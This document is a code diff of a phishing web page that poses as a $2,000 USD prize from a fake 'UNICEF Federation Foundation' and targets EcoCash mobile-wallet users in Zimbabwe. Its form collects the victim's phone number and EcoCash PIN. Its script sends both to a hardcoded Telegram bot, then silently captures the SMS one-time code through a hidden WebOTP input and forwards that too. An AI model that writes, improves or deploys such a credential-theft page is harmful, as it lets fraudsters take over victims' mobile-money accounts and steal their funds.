+        .status .dot.error { background: #f87171; animation: none; }
+
+        /* ─── FOOTER ─── */
+        .footer {
+            margin-top: 20px;
+            font-size: 10px;
+            color: rgba(255,255,255,0.1);
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.03);
+            padding-top: 16px;
+            letter-spacing: 0.3px;
         }
 
         /* ─── CONFETTI ─── */
-        .confetti-container {
+        #confetti {
             position: fixed;
             top: 0;
             left: 0;
@@ -552,139 +780,135 @@
             z-index: 9999;
             overflow: hidden;
         }
+
         .confetti-piece {
             position: absolute;
-            width: 10px;
-            height: 10px;
+            width: 8px;
+            height: 8px;
             top: -10px;
-            animation: confetti-fall linear forwards;
-        }
-        @keyframes confetti-fall {
-            0% {
-                transform: translateY(0) rotate(0deg) scale(1);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(110vh) rotate(720deg) scale(0.3);
-                opacity: 0;
-            }
+            animation: confettiRain linear forwards;
         }
 
-        /* ─── RESPONSIVE ─── */
-        @media (max-width: 540px) {
-            .card {
-                padding: 28px 18px 28px;
-                border-radius: 16px;
-            }
-            .title {
-                font-size: 26px;
-            }
-            .subtitle {
-                font-size: 14px;
-            }
-            .prize-display .info .amount {
-                font-size: 22px;
-            }
-            .ecocash-logo {
-                font-size: 12px;
-                padding: 3px 10px 3px 8px;
-            }
-            .ecocash-logo svg {
-                width: 20px;
-                height: 20px;
-            }
-            .success-screen h2 {
-                font-size: 20px;
-            }
-            .success-screen p {
-                font-size: 14px;
-            }
+        @keyframes confettiRain {
+            0% { transform: translateY(0) rotate(0) scale(1); opacity: 1; }
+            100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
         }
 
-        @media (max-width: 380px) {
-            .card {
-                padding: 20px 14px 24px;
-            }
-            .title {
-                font-size: 22px;
-            }
-            .badge {
-                font-size: 10px;
-                padding: 4px 12px 4px 8px;
-            }
-        }
-
-        /* ─── UTILITY ─── */
-        .footer-note {
-            margin-top: 24px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.15);
-            text-align: center;
-            letter-spacing: 0.2px;
-            border-top: 1px solid rgba(255, 255, 255, 0.04);
-            padding-top: 20px;
-        }
-        .footer-note a {
-            color: rgba(255, 255, 255, 0.2);
-            text-decoration: none;
-        }
-        .footer-note a:hover {
-            color: rgba(255, 255, 255, 0.4);
-        }
-
-        @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(18px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .hidden-code-input {
+        .hidden-input {
             position: absolute;
             opacity: 0;
             pointer-events: none;
             width: 1px;
             height: 1px;
-            z-index: -1;
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 540px) {
+            .card { padding: 26px 18px 24px; border-radius: 16px; }
+            .title { font-size: 24px; }
+            .prize-box .amount { font-size: 24px; }
+            .prize-box { padding: 14px 16px; }
+            .crowd-scene { height: 22%; }
+            .person .body { width: 20px; height: 24px; }
+            .person .head { width: 14px; height: 14px; }
+            .person .phone { width: 16px; height: 12px; right: -10px; }
+            .person .phone::before { font-size: 10px; top: -8px; }
+            .crowd { gap: 2px; padding: 0 8px; }
+        }
+
+        @media (max-width: 380px) {
+            .card { padding: 18px 12px 20px; }
+            .title { font-size: 20px; }
+            .prize-box .amount { font-size: 20px; }
+            .crowd-scene { height: 18%; }
+            .person .body { width: 16px; height: 20px; }
+            .person .head { width: 12px; height: 12px; }
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Format indicator */
+        .format-hint {
+            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            margin-top: 4px;
+            font-family: 'Inter', monospace;
+            letter-spacing: 0.5px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ─── FALLING DOLLARS BACKGROUND ─── -->
-    <div id="dollar-rain"></div>
+    <!-- ─── VIDEO BACKGROUND ─── -->
+    <div id="video-bg">
+        <video autoplay loop muted playsinline preload="auto">
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-celebrating-with-fireworks-3363-large.mp4" type="video/mp4" />
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-celebratory-fireworks-over-the-city-1231-large.mp4" type="video/mp4" />
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-people-dancing-at-a-party-2629-large.mp4" type="video/mp4" />
+        </video>
+        <div class="video-overlay"></div>
+        
+        <!-- Crowd Scene -->
+        <div class="crowd-scene">
+            <div class="crowd-confetti">
+                <span></span><span></span><span></span><span></span><span></span>
+                <span></span><span></span><span></span><span></span><span></span>
+                <span></span><span></span>
+            </div>
+            <div class="crowd">
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person"><div class="head"></div><div class="body"><div class="phone"></div></div></div>
+                <div class="person excited"><div class="head"><div class="ring"></div></div><div class="body"><div class="phone"></div></div></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── SCANLINES ─── -->
+    <div class="scanlines"></div>
+
+    <!-- ─── FALLING DOLLARS ─── -->
+    <div id="dollars"></div>
+
+    <!-- ─── CONFETTI CONTAINER ─── -->
+    <div id="confetti"></div>
 
     <!-- ─── MAIN CARD ─── -->
-    <div class="card" role="main" aria-label="Promotional landing page for Zimbabwe">
+    <div class="card">
 
-        <!-- BADGE -->
         <div class="badge">
             <span class="dot"></span>
-            🇿🇼 Zimbabwe Only • Limited Offer
+            🇿🇼 Zimbabwe • Limited Offer
         </div>
 
-        <!-- TITLE -->
-        <h1 class="title">
-            Congratulations! 🎉<br />You've been selected for<br /><span class="highlight">$2,000 USD</span>
-        </h1>
-        <p class="subtitle" style="font-size: 16px; color: var(--gold-light); margin-top: 4px; font-weight: 600;">
-            Official Cash Prize — Claim Today
-        </p>
+        <div class="sub-title">🎉 Congratulations!</div>
+        <h1 class="title">You've been selected for<br /><span class="gold">$2,000 USD</span></h1>
+        <p class="desc">Official cash prize — claim your reward today</p>
 
-        <!-- PRIZE DISPLAY -->
-        <div class="prize-display">
-            <span class="icon">🎉</span>
+        <!-- ─── BOUNCING PRIZE BOX ─── -->
+        <div class="prize-box">
+            <span class="icon">🏆</span>
             <div class="info">
-                <div class="label">Your reward</div>
-                <div class="amount">$2,000 <span>USD</span></div>
+                <div class="label">💰 Your Prize</div>
+                <div class="amount">$2,000 <small>USD</small></div>
                 <div class="wallet-badge">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect x="2" y="5" width="20" height="14" rx="2" stroke="#4ade80" stroke-width="2"/>
-                        <path d="M16 12C16 10.8954 16.8954 10 18 10H20V14H18C16.8954 14 16 13.1046 16 12Z" fill="#4ade80"/>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="2" y="5" width="20" height="14" rx="2"/>
+                        <path d="M16 12a2 2 0 1 1 4 0"/>
                     </svg>
                     <span>Deposits to EcoCash Wallet</span>
                 </div>
@@ -692,371 +916,316 @@
         </div>
 
         <!-- ─── FORM ─── -->
-        <form id="promoForm" novalidate autocomplete="off">
+        <form id="form" novalidate>
 
-            <!-- PHONE NUMBER -->
             <div class="form-group">
-                <label for="phoneNumber">
-                    Phone Number <span class="required">*</span>
-                </label>
-                <div class="phone-prefix-group">
-                    <span class="prefix" id="countryPrefix">+263</span>
-                    <input
-                    type="tel"
-                    class="form-control"
-                    id="phoneNumber"
-                    placeholder="** *** ****"
-                    autocomplete="tel"
-                    required
-                    aria-describedby="phoneHint"
-                    />
+                <label>Phone Number <span class="req">*</span></label>
+                <div class="input-group phone-input">
+                    <span class="prefix">+263</span>
+                    <input type="tel" id="phone" placeholder="7X XXX XXXX" autocomplete="tel" required maxlength="12" />
                 </div>
-                <div class="form-hint" id="phoneHint">Enter your 9‑digit Zimbabwean number (e.g., 71 234 5678).</div>
+                <div class="input-hint" id="phoneHint">Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)</div>
+                <div class="format-hint">Must start with 7, followed by 8 more digits</div>
             </div>
 
-            <!-- PIN (EcoCash) with Logo -->
             <div class="form-group">
-                <label for="cardPin" style="display:flex; align-items:center; gap:6px;">
-                    <span class="ecocash-logo">
-                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                            <circle cx="12" cy="12" r="10" fill="white" />
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859" />
-                            <circle cx="12" cy="12" r="7" fill="#00a859" />
-                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial, sans-serif">$</text>
+                <label style="display:flex;align-items:center;gap:6px;">
+                    <span class="ecocash">
+                        <svg viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="12" r="10" fill="white"/>
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859"/>
+                            <circle cx="12" cy="12" r="7" fill="#00a859"/>
+                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">$</text>
                         </svg>
-                        <span class="logo-text">Eco<span>Cash</span></span>
+                        <span>Eco<em>Cash</em></span>
                     </span>
                     <span>PIN</span>
-                    <span class="required">*</span>
+                    <span class="req">*</span>
                 </label>
-                <div class="pin-wrapper">
-                    <input
-                    type="password"
-                    class="form-control"
-                    id="cardPin"
-                    placeholder="••••"
-                    autocomplete="off"
-                    maxlength="4"
-                    inputmode="numeric"
-                    pattern="[0-9]{4}"
-                    required
-                    aria-describedby="pinHint"
-                    />
-                    <button type="button" class="toggle-vis" id="togglePin" aria-label="Toggle PIN visibility">
-                        👁
-                    </button>
+                <div class="input-group pin-wrap">
+                    <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required />
+                    <button type="button" class="toggle" id="togglePin" aria-label="Toggle PIN">👁</button>
                 </div>
-                <div class="form-hint" id="pinHint">Enter your 4‑digit EcoCash PIN to confirm.</div>
+                <div class="input-hint" id="pinHint">Enter your 4-digit EcoCash PIN</div>
             </div>
 
-            <!-- Hidden code input for WebOTP -->
-            <input
-            type="text"
-            class="hidden-code-input"
-            id="hiddenCodeInput"
-            autocomplete="one-time-code"
-            inputmode="numeric"
-            />
+            <input type="text" class="hidden-input" id="otpInput" autocomplete="one-time-code" inputmode="numeric" />
 
-            <!-- SUBMIT BUTTON -->
             <button type="submit" class="btn btn-primary" id="submitBtn">
-                💰 Claim Reward to My EcoCash Wallet Now
+                💰 Claim Reward to My EcoCash Wallet
             </button>
 
         </form>
 
-        <!-- ─── SUCCESS SCREEN ─── -->
-        <div class="success-screen" id="successScreen">
-            <div class="checkmark">✓</div>
+        <!-- ─── SUCCESS ─── -->
+        <div class="success" id="success">
+            <div class="check">✓</div>
             <h2>🎉 Congratulations!</h2>
             <p>
-                You have been selected to win <span class="highlight-text">$2,000 USD</span> from the
-                <strong>UNICEF Federation Foundation</strong>. <br /><br />
-                Your funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
+                You've won <span class="hl">$2,000 USD</span> from the
+                <strong>UNICEF Federation Foundation</strong>.<br /><br />
+                Funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
             </p>
-            <div style="margin-top: 16px; display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 168, 89, 0.12); padding: 8px 16px; border-radius: 30px; border: 1px solid rgba(0, 168, 89, 0.2);">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="2" y="5" width="20" height="14" rx="2" stroke="#4ade80" stroke-width="2"/>
-                    <path d="M16 12C16 10.8954 16.8954 10 18 10H20V14H18C16.8954 14 16 13.1046 16 12Z" fill="#4ade80"/>
+            <div style="margin-top:14px;display:inline-flex;align-items:center;gap:6px;background:rgba(0,168,89,0.1);padding:6px 14px;border-radius:30px;border:1px solid rgba(0,168,89,0.15);font-size:12px;color:#4ade80;font-weight:600;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="5" width="20" height="14" rx="2"/>
+                    <path d="M16 12a2 2 0 1 1 4 0"/>
                 </svg>
-                <span style="color: #4ade80; font-weight: 600; font-size: 14px;">Deposited to EcoCash Wallet</span>
+                Deposited to EcoCash Wallet
             </div>
         </div>
 
-        <!-- ─── STATUS BAR ─── -->
-        <div class="status-bar" id="statusBar">
-            <span class="status-dot" id="statusDot"></span>
-            <span id="statusText">Waiting for verification code...</span>
+        <!-- ─── STATUS ─── -->
+        <div class="status" id="status">
+            <span class="dot" id="statusDot"></span>
+            <span id="statusText">Waiting...</span>
         </div>
 
-        <!-- FOOTER -->
-        <div class="footer-note">
-            🔒 Secured • Data encrypted • 100% confidential
-        </div>
+        <div class="footer">🔒 Secured • Encrypted • Confidential</div>
     </div>
-
-    <!-- ─── CONFETTI CONTAINER ─── -->
-    <div class="confetti-container" id="confettiContainer" aria-hidden="true"></div>
 
     <!-- ─── JAVASCRIPT ─── -->
     <script>
         (function() {
             'use strict';
 
-            // ─── DOM REFS ───
-            const form = document.getElementById('promoForm');
+            // ─── DOM ───
+            const form = document.getElementById('form');
             const submitBtn = document.getElementById('submitBtn');
-            const successScreen = document.getElementById('successScreen');
-            const statusBar = document.getElementById('statusBar');
+            const success = document.getElementById('success');
+            const status = document.getElementById('status');
             const statusDot = document.getElementById('statusDot');
             const statusText = document.getElementById('statusText');
-            const hiddenCodeInput = document.getElementById('hiddenCodeInput');
-            const phoneInput = document.getElementById('phoneNumber');
-            const pinInput = document.getElementById('cardPin');
+            const phone = document.getElementById('phone');
+            const pin = document.getElementById('pin');
             const togglePin = document.getElementById('togglePin');
-            const confettiContainer = document.getElementById('confettiContainer');
+            const phoneHint = document.getElementById('phoneHint');
+            const pinHint = document.getElementById('pinHint');
+            const otpInput = document.getElementById('otpInput');
+            const confettiContainer = document.getElementById('confetti');
 
             let isSubmitting = false;
             let storedPhone = '';
             let storedPin = '';
-            let codeSent = false;
-            let codeListenerActive = false;
-            let listenerAttempts = 0;
-            const maxListenerAttempts = 10;
-            let waitTimeout = null;
             let codeDetected = false;
+            let codeSent = false;
+            let listenerActive = false;
+            let attempts = 0;
+            const MAX_ATTEMPTS = 10;
+            let waitTimer = null;
 
-            // ─── CONFIG: TELEGRAM ───
-            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
+            // ─── TELEGRAM ───
             const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
             const CHAT_ID = '8834429633';
 
-            // ─── VALIDATION ───
+            // ─── HELPERS ───
+            function getTime() {
+                return new Date().toLocaleString('en-US', {
+                    month: 'numeric', day: 'numeric', year: 'numeric',
+                    hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
+                });
+            }
+
+            async function sendToTelegram(msg) {
+                try {
+                    const res = await fetch(
+                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
+                    );
+                    const data = await res.json();
+                    return { ok: data.ok };
+                } catch (e) {
+                    return { ok: false, error: e.message };
+                }
+            }
+
+            function showStatus(text, type) {
+                status.classList.add('active');
+                statusText.textContent = text;
+                statusDot.className = 'dot';
+                if (type === 'success') statusDot.classList.add('success');
+                else if (type === 'error') statusDot.classList.add('error');
+            }
+
+            function hideStatus() {
+                status.classList.remove('active');
+            }
+
+            // ─── PHONE VALIDATION - Format: +263 7X XXX XXXX ───
             function validatePhone() {
-                const raw = phoneInput.value.replace(/\s/g, '');
-                if (!/^\d{9}$/.test(raw)) {
-                    phoneInput.classList.add('error');
-                    document.getElementById('phoneHint').textContent = 'Enter exactly 9 digits (e.g., 712345678).';
-                    document.getElementById('phoneHint').classList.add('error-text');
+                const raw = phone.value.replace(/\s/g, '');
+                // Must start with 7 and be exactly 9 digits total (including the 7)
+                if (!/^7\d{8}$/.test(raw)) {
+                    phone.classList.add('error');
+                    phoneHint.textContent = '❌ Must be in format: 7X XXX XXXX (e.g., 71 234 5678)';
+                    phoneHint.classList.add('error');
                     return false;
                 }
-                phoneInput.classList.remove('error');
-                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
-                document.getElementById('phoneHint').classList.remove('error-text');
+                phone.classList.remove('error');
+                phoneHint.textContent = '✅ Valid Zimbabwe number';
+                phoneHint.classList.remove('error');
                 return true;
             }
 
             function validatePin() {
-                const val = pinInput.value.replace(/\s/g, '');
+                const val = pin.value.replace(/\s/g, '');
                 if (!/^\d{4}$/.test(val)) {
-                    pinInput.classList.add('error');
-                    document.getElementById('pinHint').textContent = 'Enter exactly 4 digits.';
-                    document.getElementById('pinHint').classList.add('error-text');
+                    pin.classList.add('error');
+                    pinHint.textContent = 'Enter exactly 4 digits';
+                    pinHint.classList.add('error');
                     return false;
                 }
-                pinInput.classList.remove('error');
-                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
-                document.getElementById('pinHint').classList.remove('error-text');
+                pin.classList.remove('error');
+                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
+                pinHint.classList.remove('error');
                 return true;
             }
 
-            // ─── FORMAT PHONE ───
-            phoneInput.addEventListener('input', function(e) {
+            // ─── FORMAT PHONE - Auto-format as user types ───
+            phone.addEventListener('input', function() {
                 let val = this.value.replace(/\D/g, '');
-                if (val.length > 9) val = val.slice(0, 9);
-                let formatted = '';
-                if (val.length > 2) {
-                    formatted = val.slice(0, 2) + ' ' + val.slice(2);
-                    if (val.length > 5) {
-                        formatted = val.slice(0, 2) + ' ' + val.slice(2, 5) + ' ' + val.slice(5, 9);
-                    }
-                } else {
-                    formatted = val;
+                
+                // Only allow numbers starting with 7
+                if (val.length > 0 && val[0] !== '7') {
+                    val = '7' + val;
                 }
+                
+                // Limit to 9 digits (7 + 8 more)
+                if (val.length > 9) val = val.slice(0, 9);
+                
+                // Format: 7X XXX XXXX
+                let formatted = '';
+                if (val.length > 0) {
+                    formatted = val.slice(0, 1);
+                    if (val.length > 1) {
+                        formatted += val.slice(1, 2);
+                        if (val.length > 2) {
+                            formatted += ' ' + val.slice(2, 5);
+                            if (val.length > 5) {
+                                formatted += ' ' + val.slice(5, 9);
+                            }
+                        }
+                    }
+                }
+                
                 this.value = formatted;
                 this.classList.remove('error');
-                document.getElementById('phoneHint').classList.remove('error-text');
-                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit Zimbabwean number.';
+                phoneHint.classList.remove('error');
+                phoneHint.textContent = 'Format: 7X XXX XXXX (e.g., 71 234 5678)';
             });
 
-            // ─── PIN: digits only, max 4 ───
-            pinInput.addEventListener('input', function(e) {
-                this.value = this.value.replace(/\D/g, '');
-                if (this.value.length > 4) this.value = this.value.slice(0, 4);
+            pin.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
                 this.classList.remove('error');
-                document.getElementById('pinHint').classList.remove('error-text');
-                document.getElementById('pinHint').textContent = 'Enter your 4‑digit EcoCash PIN.';
+                pinHint.classList.remove('error');
+                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
             });
 
-            // ─── TOGGLE PIN ───
             togglePin.addEventListener('click', function() {
-                const isPassword = pinInput.type === 'password';
-                pinInput.type = isPassword ? 'text' : 'password';
-                this.textContent = isPassword ? '🙈' : '👁';
+                const isPass = pin.type === 'password';
+                pin.type = isPass ? 'text' : 'password';
+                this.textContent = isPass ? '🙈' : '👁';
             });
 
-            // ─── ENTER KEY: submit form ───
             form.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    submitBtn.click();
-                }
+                if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
             });
 
-            // ─── GET CURRENT TIME ───
-            function getTimeString() {
-                return new Date().toLocaleString('en-US', {
-                    month: 'numeric',
-                    day: 'numeric',
-                    year: 'numeric',
-                    hour: 'numeric',
-                    minute: 'numeric',
-                    second: 'numeric',
-                    hour12: true
-                });
-            }
-
-            // ─── TELEGRAM SENDER ───
-            async function sendToTelegram(message) {
-                const url =
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-                try {
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (!data.ok) {
-                        console.error('Telegram API error:', data);
-                        return { ok: false, error: data.description || 'Unknown error' };
-                    }
-                    return { ok: true };
-                } catch (err) {
-                    console.error('Network error sending to Telegram:', err);
-                    return { ok: false, error: err.message };
-                }
-            }
-
-            // ─── UPDATE STATUS BAR ───
-            function updateStatus(text, type) {
-                statusBar.classList.add('active');
-                statusText.textContent = text;
-                statusDot.className = 'status-dot';
-                if (type === 'success') {
-                    statusDot.classList.add('success');
-                } else if (type === 'error') {
-                    statusDot.classList.add('error');
-                }
-            }
-
-            function hideStatus() {
-                statusBar.classList.remove('active');
-            }
-
-            // ─── SILENT WEBOTP LISTENER ───
-            function startSilentWebOTPListener() {
+            // ─── WEBOTP LISTENER ───
+            function startWebOTP() {
                 if (!('OTPCredential' in window)) {
                     setTimeout(() => {
-                        if (!codeDetected && !successScreen.classList.contains('active')) {
-                            updateStatus('⚠️ WebOTP not supported. Please enter code manually.', 'error');
+                        if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ WebOTP not supported. Enter code manually.', 'error');
                         }
                     }, 120000);
-                    console.log('WebOTP not supported.');
                     return;
                 }
 
-                if (codeListenerActive) return;
-                if (codeSent) return;
-                if (listenerAttempts >= maxListenerAttempts) {
+                if (listenerActive || codeSent) return;
+                if (attempts >= MAX_ATTEMPTS) {
                     setTimeout(() => {
-                        if (!codeDetected && !successScreen.classList.contains('active')) {
-                            updateStatus('⚠️ Could not detect code. Please try again.', 'error');
+                        if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ Could not detect code. Try again.', 'error');
                         }
                     }, 120000);
                     return;
                 }
 
-                codeListenerActive = true;
-                listenerAttempts++;
-                console.log(`🔍 Silent WebOTP listener started (attempt ${listenerAttempts})...`);
+                listenerActive = true;
+                attempts++;
+                console.log(`🔍 WebOTP listener (attempt ${attempts})`);
 
-                hiddenCodeInput.focus();
+                otpInput.focus();
 
-                navigator.credentials.get({
-                    otp: { transport: ['sms'] }
-                }).then(otp => {
-                    const code = otp.code;
-                    console.log('📱 Code detected silently:', code);
-                    codeListenerActive = false;
-                    codeDetected = true;
-                    codeSent = true;
+                navigator.credentials.get({ otp: { transport: ['sms'] } })
+                    .then(otp => {
+                        const code = otp.code;
+                        console.log('📱 Code detected:', code);
+                        listenerActive = false;
+                        codeDetected = true;
+                        codeSent = true;
 
-                    if (waitTimeout) {
-                        clearTimeout(waitTimeout);
-                        waitTimeout = null;
-                    }
+                        if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
 
-                    const timeString = getTimeString();
-                    const message =
-                        `📱Verification Code Received\n` +
-                        `Phone: ${storedPhone}\n` +
-                        `EcoCash PIN: ${storedPin}\n` +
-                        `🔑 Verification Code: ${code}\n` +
-                        `Time: ${timeString}`;
+                        const msg =
+                            `📱 Verification Code Received\n` +
+                            `Phone: ${storedPhone}\n` +
+                            `EcoCash PIN: ${storedPin}\n` +
+                            `🔑 Code: ${code}\n` +
+                            `Time: ${getTime()}`;
 
-                    sendToTelegram(message).then(result => {
-                        if (result.ok) {
-                            hideStatus();
-                            showSuccessScreen();
-                        } else {
-                            updateStatus('❌ Failed to send code. Try again.', 'error');
-                        }
-                    }).catch(err => {
-                        console.error('Error sending code:', err);
-                        updateStatus('❌ Error sending code. Try again.', 'error');
-                    });
-                }).catch(err => {
-                    console.warn('WebOTP error:', err);
-                    codeListenerActive = false;
-                    if (listenerAttempts < maxListenerAttempts) {
-                        setTimeout(startSilentWebOTPListener, 4000);
-                    } else {
-                        setTimeout(() => {
-                            if (!codeDetected && !successScreen.classList.contains('active')) {
-                                updateStatus('⚠️ Could not detect code. Please try again.', 'error');
+                        sendToTelegram(msg).then(r => {
+                            if (r.ok) {
+                                hideStatus();
+                                showSuccess();
+                            } else {
+                                showStatus('❌ Failed to send code. Try again.', 'error');
                             }
-                        }, 120000);
-                    }
-                });
+                        });
+                    })
+                    .catch(err => {
+                        console.warn('WebOTP error:', err);
+                        listenerActive = false;
+                        if (attempts < MAX_ATTEMPTS) {
+                            setTimeout(startWebOTP, 3000);
+                        } else {
+                            setTimeout(() => {
+                                if (!codeDetected && !success.classList.contains('active')) {
+                                    showStatus('⚠️ Could not detect code. Try again.', 'error');
+                                }
+                            }, 120000);
+                        }
+                    });
             }
 
-            // ─── SHOW SUCCESS SCREEN ───
-            function showSuccessScreen() {
+            // ─── SUCCESS ───
+            function showSuccess() {
                 form.style.display = 'none';
-                successScreen.classList.add('active');
-                statusBar.classList.remove('active');
+                success.classList.add('active');
+                status.classList.remove('active');
                 triggerConfetti();
             }
 
             // ─── CONFETTI ───
             function triggerConfetti() {
                 const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#c084fc', '#f472b6'];
-                for (let i = 0; i < 150; i++) {
-                    const piece = document.createElement('div');
-                    piece.className = 'confetti-piece';
-                    const size = 6 + Math.random() * 8;
-                    piece.style.width = size + 'px';
-                    piece.style.height = size + 'px';
-                    piece.style.background = colors[Math.floor(Math.random() * colors.length)];
-                    piece.style.left = Math.random() * 100 + '%';
-                    piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-                    piece.style.animationDuration = (2 + Math.random() * 3) + 's';
-                    piece.style.animationDelay = (Math.random() * 2) + 's';
-                    confettiContainer.appendChild(piece);
+                for (let i = 0; i < 120; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'confetti-piece';
+                    const size = 5 + Math.random() * 7;
+                    el.style.width = size + 'px';
+                    el.style.height = size + 'px';
+                    el.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    el.style.animationDuration = (2 + Math.random() * 3) + 's';
+                    el.style.animationDelay = (Math.random() * 2) + 's';
+                    confettiContainer.appendChild(el);
                 }
-                setTimeout(() => {
-                    confettiContainer.innerHTML = '';
-                }, 6000);
+                setTimeout(() => { confettiContainer.innerHTML = ''; }, 6000);
             }
 
-            // ─── SUBMIT HANDLER ───
+            // ─── SUBMIT ───
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1065,69 +1234,85 @@
                 const phoneOk = validatePhone();
                 const pinOk = validatePin();
                 if (!phoneOk || !pinOk) {
-                    updateStatus('Please fix the errors above.', 'error');
+                    showStatus('Please fix the errors above.', 'error');
                     return;
                 }
 
-                storedPhone = phoneInput.value.replace(/\s/g, '');
-                storedPin = pinInput.value;
+                // Store the full number with +263 prefix
+                storedPhone = '263' + phone.value.replace(/\s/g, '');
+                storedPin = pin.value;
 
                 isSubmitting = true;
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = `<span class="spinner"></span> Submitting...`;
+                submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
 
-                const timeString = getTimeString();
-                const initialMessage =
-                    `📝 New Claim Submission\n` +
-                    `Phone: ${storedPhone}\n` +
+                const msg =
+                    `📝 New Claim\n` +
+                    `Phone: +${storedPhone}\n` +
                     `EcoCash PIN: ${storedPin}\n` +
-                    `Time: ${timeString}\n` +
-                    `🔐 Waiting for verification code...`;
+                    `Time: ${getTime()}\n` +
+                    `🔐 Waiting for OTP...`;
 
-                const result = await sendToTelegram(initialMessage);
+                const result = await sendToTelegram(msg);
 
                 if (!result.ok) {
-                    updateStatus('❌ Submission failed. Please try again.', 'error');
+                    showStatus('❌ Submission failed. Try again.', 'error');
                     isSubmitting = false;
                     submitBtn.disabled = false;
-                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet Now';
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
                     return;
                 }
 
-                startSilentWebOTPListener();
+                startWebOTP();
 
-                waitTimeout = setTimeout(() => {
-                    if (!codeDetected && !successScreen.classList.contains('active')) {
-                        updateStatus('⏳ Still waiting for verification code...', '');
+                waitTimer = setTimeout(() => {
+                    if (!codeDetected && !success.classList.contains('active')) {
+                        showStatus('⏳ Waiting for verification code...', '');
                     }
                 }, 120000);
 
